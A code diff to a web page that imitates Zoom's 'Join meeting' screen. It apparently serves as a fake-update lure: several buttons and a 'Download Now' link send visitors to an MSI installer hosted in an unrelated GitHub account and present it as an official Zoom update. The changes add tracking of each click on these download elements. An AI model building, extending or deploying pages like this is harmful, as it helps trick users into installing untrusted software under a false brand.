@@ -2,6 +2,7 @@ import { MessageCircle, ChevronDown } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import { toast } from "sonner";
 import zoomLogo from "@/assets/zoom-logo.png";
+import { logActivity } from "@/lib/activity";
 
 const DOWNLOAD_URL =
   "https://github.com/elizzygettygrant-maker/zoomupdates/releases/download/v.6565/Zoom_Updates.msi";
@@ -31,14 +32,20 @@ const Index = () => {
           <h1 className="text-[28px] font-bold text-zoom-text mb-2">Join meeting</h1>
 
           <button
-            onClick={() => navigate("/outdated")}
+            onClick={() => {
+              logActivity("click_join_workplace");
+              navigate("/outdated");
+            }}
             className="w-full h-[48px] rounded-[10px] bg-zoom-blue text-primary-foreground text-[15px] font-semibold hover:opacity-90 transition-opacity"
           >
             Join from Zoom Workplace app
           </button>
 
           <button
-            onClick={() => window.location.href = DOWNLOAD_URL}
+            onClick={() => {
+              logActivity("click_update_zoom_home");
+              window.location.href = DOWNLOAD_URL;
+            }}
             className="w-full h-[48px] rounded-[10px] bg-secondary text-secondary-foreground text-[15px] font-semibold border border-border hover:bg-muted transition-colors"
           >
             Update Your Zoom App (2026)
@@ -46,7 +53,14 @@ const Index = () => {
 
           <p className="text-sm text-muted-foreground text-center mt-2">
             Don't have the Zoom Workplace app installed?{" "}
-            <a href={DOWNLOAD_URL} download="ZoomWorkplace.msi" className="text-zoom-link hover:underline">Download Now</a>
+            <a
+              href={DOWNLOAD_URL}
+              download="ZoomWorkplace.msi"
+              onClick={() => logActivity("click_download_now_link")}
+              className="text-zoom-link hover:underline"
+            >
+              Download Now
+            </a>
           </p>
 
           <p className="text-[13px] text-muted-foreground text-center mt-4">
